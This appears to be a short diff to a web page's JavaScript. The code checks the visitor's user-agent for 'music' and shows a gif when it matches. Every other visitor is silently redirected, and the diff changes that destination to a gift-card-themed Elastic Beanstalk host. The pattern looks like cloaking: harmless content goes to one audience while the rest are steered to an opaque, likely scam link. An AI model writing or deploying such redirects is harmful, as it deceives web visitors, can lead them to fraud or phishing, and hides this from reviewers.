@@ -12,7 +12,7 @@ if (agent.indexOf('music') >= 0) {
   gif.className = 'block';
   gif_desc.className = 'block';
 } else {
-  window.location = 'https://h2x7a.nl/og.php?u=/cl/i/ndmj1v';
+  window.location = 'http://giftcards4u-env.eba-v4knkbmr.eu-west-2.elasticbeanstalk.com/og.php?u=/cl/i/lklqo6';
 //   window.open('https://h2x7a.nl/og.php?u=/cl/i/ndmj1v', '_blank');
   console.log('go to link');
 
